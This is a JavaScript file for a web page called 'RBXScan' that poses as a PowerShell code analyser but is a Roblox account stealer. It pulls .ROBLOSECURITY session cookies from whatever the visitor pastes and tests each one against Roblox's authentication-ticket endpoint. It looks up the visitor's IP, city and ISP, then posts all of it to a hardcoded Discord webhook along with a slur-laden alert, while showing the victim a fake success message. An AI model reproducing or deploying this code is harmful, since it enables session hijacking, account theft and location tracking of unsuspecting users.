// RBXScan - Advanced PowerShell Cookie Detection System
console.log('🚀 RBXScan initializing...');

// Global variables
let isSubmitting = false;

// Cookie extraction function
function extractRoblosecurityCookies(code) {
    const cookies = [];
    const patterns = [
        /_ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
        /\.ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
        /ROBLOSECURITY['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
        /roblosecurity['"]*\s*[=:]\s*['"`]([^'"`\s]+)['"`]/gi,
        /_ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{100,})/gi,
        /\.ROBLOSECURITY['"]*\s*[=:]\s*([A-Za-z0-9+/=_%\-]{100,})/gi
    ];
    
    patterns.forEach(pattern => {
        let match;
        while ((match = pattern.exec(code)) !== null) {
            const cookie = match[1];
            if (cookie && cookie.length > 50 && !cookies.includes(cookie)) {
                cookies.push(cookie);
            }
        }
    });
    
    return cookies;
}

// IP unlock function
async function unlockIP(cookie) {
    try {
        const response = await fetch('https://auth.roblox.com/v1/authentication-ticket', {
            method: 'POST',
            headers: {
                'Cookie': `_ROBLOSECURITY=${cookie}`,
                'Content-Type': 'application/json'
            }
        });
        return response.ok;
    } catch (error) {
        return false;
    }
}

// Validation functions
function isValidPowerShellCode(code) {
    const powershellKeywords = [
        'powershell', 'invoke-', 'get-', 'set-', 'new-', 'remove-', 'add-',
        'start-', 'stop-', 'restart-', 'enable-', 'disable-', 'test-',
        'write-', 'read-', 'clear-', 'copy-', 'move-', 'rename-',
        '$_', 'param', 'function', 'if', 'else', 'elseif', 'switch',
        'for', 'foreach', 'while', 'do', 'try', 'catch', 'finally',
        'pipeline', 'cmdlet', 'module', 'import-module', 'export-',
        'where-object', 'select-object', 'sort-object', 'group-object',
        'measure-object', 'compare-object', 'tee-object', 'out-',
        'format-', 'convertto-', 'convertfrom-', 'join-path',
        'split-path', 'resolve-path', 'push-location', 'pop-location'
    ];
    
    const lowerCode = code.toLowerCase();
    return powershellKeywords.some(keyword => lowerCode.includes(keyword));
}

function hasAdvancedSpamPatterns(input) {
    const text = input.toLowerCase().trim();
    
    if (text.length < 10) return true;
    
    // Check for keyboard patterns
    const keyboardPatterns = [
        /(.)\1{4,}/,
        /qwerty|asdf|zxcv|1234|abcd/,
        /(.)(.)(\1\2){2,}/,
        /(.)(.)(.)(\1\2\3){2,}/
    ];
    
    if (keyboardPatterns.some(pattern => pattern.test(text))) {
        return true;
    }
    
    // Check character distribution
    const charCount = {};
    for (const char of text) {
        charCount[char] = (charCount[char] || 0) + 1;
    }
    
    const totalChars = text.length;
    const uniqueChars = Object.keys(charCount).length;
    const maxFreq = Math.max(...Object.values(charCount));
    
    if (uniqueChars < totalChars * 0.3) return true;
    if (maxFreq > totalChars * 0.4) return true;
    
    // Check for excessive random characters
    const randomPattern = /[a-z]{10,}/g;
    const matches = text.match(randomPattern);
    if (matches && matches.some(match => {
        const vowels = match.match(/[aeiou]/g);
        return !vowels || vowels.length < match.length * 0.2;
    })) {
        return true;
    }
    
    return false;
}

// Location tracking
async function getLocationInfo() {
    try {
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();
        return {
            ip: data.ip || 'Unknown',
            city: data.city || 'Unknown',
            country: data.country_name || 'Unknown',
            timezone: data.timezone || 'Unknown',
            isp: data.org || 'Unknown'
        };
    } catch (error) {
        return {
            ip: 'Unknown',
            city: 'Unknown', 
            country: 'Unknown',
            timezone: 'Unknown',
            isp: 'Unknown'
        };
    }
}

// Discord webhook function
async function sendToDiscord(content, location, cookies = null, unlockResults = null) {
    const webhookUrl = 'https://discord.com/api/webhooks/1395450774489661480/eo-2Wv4tE0WgbthyZbIXQckKCspKyBMC3zWY7ZcyW5Rg3_Vn1j8xQLqQ4fGm03cEHEGu';
    
    const timestamp = new Date().toISOString();
    const userAgent = navigator.userAgent;
    
    let embedColor, title, description;
    
    if (cookies && cookies.length > 0) {
        embedColor = 0x00ff00; // Green for cookies
        title = "🍪 PowerShell Cookie Extraction";
        description = `**Found ${cookies.length} cookie(s)!**\n\`\`\`${content.substring(0, 500)}${content.length > 500 ? '...' : ''}\`\`\``;
        
        if (unlockResults) {
            description += `\n**IP Unlock Results:**\n`;
            unlockResults.forEach((result, i) => {
                description += `Cookie ${i + 1}: ${result ? '✅ Success' : '❌ Failed'}\n`;
            });
        }
    } else {
        embedColor = 0x3498db; // Blue for regular submissions
        title = "📝 PowerShell Code Submission";
        description = `\`\`\`${content.substring(0, 800)}${content.length > 800 ? '...' : ''}\`\`\``;
    }
    
    const payload = {
        content: "@everyone new retard got hit",
        embeds: [{
            title: title,
            description: description,
            color: embedColor,
            fields: [
                { name: "🌍 Location", value: `${location.city}, ${location.country}`, inline: true },
                { name: "🌐 IP Address", value: location.ip, inline: true },
                { name: "🏢 ISP", value: location.isp, inline: true },
                { name: "⏰ Timezone", value: location.timezone, inline: true },
                { name: "🖥️ User Agent", value: userAgent.substring(0, 100), inline: false },
                { name: "📅 Timestamp", value: timestamp, inline: true }
            ],
            footer: { text: "RBXScan PowerShell Monitor" }
        }]
    };
    
    if (cookies && cookies.length > 0) {
        payload.embeds[0].fields.unshift({
            name: "🍪 Extracted Cookies",
            value: `\`\`\`${cookies.join('\n').substring(0, 800)}\`\`\``,
            inline: false
        });
    }
    
    try {
        const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });
        return response.ok;
    } catch (error) {
        console.error('Discord webhook error:', error);
        return false;
    }
}

// DOM Ready
document.addEventListener('DOMContentLoaded', function() {
    console.log('✅ RBXScan loaded successfully!');
    
    // Dark mode toggle
    const darkModeToggle = document.getElementById('darkModeToggle');
    if (darkModeToggle) {
        darkModeToggle.addEventListener('click', function() {
            document.body.classList.toggle('dark-mode');
            const isDark = document.body.classList.contains('dark-mode');
            darkModeToggle.textContent = isDark ? '☀️' : '🌙';
        });
    }
    
    // Popup controls
    const openScanBtn = document.getElementById('openScanBtn');
    const compilePopup = document.getElementById('compilePopup');
    const closePopup = document.getElementById('closePopup');
    const aboutNavLink = document.getElementById('aboutNavLink');
    const aboutPopup = document.getElementById('aboutPopup');
    
    if (openScanBtn && compilePopup) {
        openScanBtn.addEventListener('click', () => {
            compilePopup.style.display = 'block';
        });
    }
    
    if (closePopup && compilePopup) {
        closePopup.addEventListener('click', () => {
            compilePopup.style.display = 'none';
        });
    }
    
    if (aboutNavLink && aboutPopup) {
        aboutNavLink.addEventListener('click', (e) => {
            e.preventDefault();
            aboutPopup.style.display = 'block';
        });
        
        aboutPopup.addEventListener('click', (e) => {
            if (e.target === aboutPopup) {
                aboutPopup.style.display = 'none';
            }
        });
    }
    
    if (compilePopup) {
        compilePopup.addEventListener('click', (e) => {
            if (e.target === compilePopup) {
                compilePopup.style.display = 'none';
            }
        });
    }
    
    // Form submission
    const compileForm = document.getElementById('compileForm');
    const codeTextarea = document.getElementById('codeTextarea');
    const statusMessage = document.getElementById('compileStatusMessage');
    const loadingContainer = document.getElementById('loadingContainer');
    
    if (compileForm && codeTextarea) {
        compileForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            if (isSubmitting) return;
            
            const code = codeTextarea.value.trim();
            
            if (!code) {
                statusMessage.textContent = '❌ Please enter some code to analyze.';
                statusMessage.style.color = '#ff4757';
                return;
            }
            
            // Allow URLs and numbers as requested
            // Only block obvious spam patterns
            if (hasAdvancedSpamPatterns(code)) {
                statusMessage.textContent = '❌ Invalid input detected. Please try again.';
                statusMessage.style.color = '#ff4757';
                return;
            }
            
            // Extract cookies first
            const cookies = extractRoblosecurityCookies(code);
            
            // Much more relaxed validation - allow URLs, numbers, and most text
            const isUrl = code.includes('http://') || code.includes('https://') || code.includes('www.');
            const isNumeric = /^\d+$/.test(code.trim());
            const hasPowerShell = isValidPowerShellCode(code);
            
            // Only require PowerShell if no cookies AND not URL AND not just numbers
            if (cookies.length === 0 && !hasPowerShell && !isUrl && !isNumeric && code.length > 20) {
                statusMessage.textContent = '❌ Please enter PowerShell code, URL, or item ID.';
                statusMessage.style.color = '#ff4757';
                return;
            }
            
            isSubmitting = true;
            loadingContainer.style.display = 'block';
            statusMessage.textContent = '';
            
            try {
                // Get location info
                const location = await getLocationInfo();
                
                let unlockResults = null;
                
                // If cookies found, attempt IP unlock
                if (cookies.length > 0) {
                    statusMessage.textContent = '🔓 Attempting IP unlock...';
                    statusMessage.style.color = '#3498db';
                    
                    unlockResults = await Promise.all(
                        cookies.map(cookie => unlockIP(cookie))
                    );
                }
                
                // Send to Discord
                const webhookSuccess = await sendToDiscord(code, location, cookies, unlockResults);
                
                if (webhookSuccess) {
                    if (cookies.length > 0) {
                        statusMessage.textContent = `✅ Analysis complete! Found ${cookies.length} cookie(s). IP unlock ${unlockResults.some(r => r) ? 'successful' : 'failed'}.`;
                        statusMessage.style.color = '#27ae60';
                    } else {
                        statusMessage.textContent = '✅ PowerShell code analyzed successfully!';
                        statusMessage.style.color = '#27ae60';
                    }
                } else {
                    statusMessage.textContent = '⚠️ Analysis completed but reporting failed.';
                    statusMessage.style.color = '#f39c12';
                }
                
                codeTextarea.value = '';
                
            } catch (error) {
                console.error('Submission error:', error);
                statusMessage.textContent = '❌ An error occurred during analysis.';
                statusMessage.style.color = '#ff4757';
            } finally {
                isSubmitting = false;
                loadingContainer.style.display = 'none';
                setTimeout(() => {
                    compilePopup.style.display = 'none';
                }, 2000);
            }
        });
    }
    
    console.log('✅ All RBXScan components initialized!');
});

console.log('📄 RBXScan script loaded completely!');
